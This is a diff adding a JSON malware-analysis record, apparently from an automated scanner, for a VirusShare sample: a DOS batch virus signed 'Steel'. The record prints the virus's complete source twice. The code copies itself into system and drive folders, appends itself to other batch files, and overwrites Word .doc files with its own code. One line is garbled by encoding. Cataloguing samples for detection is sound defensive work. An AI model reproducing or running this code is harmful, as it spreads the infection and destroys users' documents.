@@ -1,0 +1,47 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "@echo off\nif \"%0\"==\"dosstart.bat\" goto tl\ncopy %0 %windir%\\dosstart.bat\n:tl\n@ctty nul\nfor %%a in (*.bat ..\\*.bat) do set _IO=%%a\nfor %%w in (%_IO%) do copy %%w+%0\ncopy %0 c:\\Virus.bat\ncopy %0 c:\\\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\u3b25\ufffd\ufffd\ufffd\\%0\ncopy %0 d:\\Virus.bat\nfor %%i in (v*.doc) do ren %%i *.bat\nfor %%t in (*.doc) do copy %0 %%t\nren *.doc v*.doc\n@ctty con\n:(c) Steel"
+    },
+    "filename": "VirusShare_f6c353df4831ce137f4cc49e2754ce49",
+    "filesize": 357,
+    "filetype": "DOS batch file, Non-ISO extended-ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "f6c353df4831ce137f4cc49e2754ce49",
+        "sha1": "5ec69172431441ddc0d7fe67cf7b6cb8308a4270",
+        "sha256": "238d1ea8b56f16f8422cd6acd04d00b5b3521241bf1640d5903f88f2183e49ae"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "if \"%0\"==\"dosstart.bat\" goto tl",
+            "copy %0 %windir%\\dosstart.bat",
+            "@ctty nul",
+            "for %%a in (*.bat ..\\*.bat) do set _IO=%%a",
+            "for %%w in (%_IO%) do copy %%w+%0",
+            "copy %0 c:\\Virus.bat",
+            "copy %0 c:\\ \u3b25\\%0",
+            "copy %0 d:\\Virus.bat",
+            "for %%i in (v*.doc) do ren %%i *.bat",
+            "for %%t in (*.doc) do copy %0 %%t",
+            "ren *.doc v*.doc",
+            "@ctty con",
+            ":(c) Steel"
+        ],
+        "file": {
+            "ren *.doc v*.doc": "Word"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.327388",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
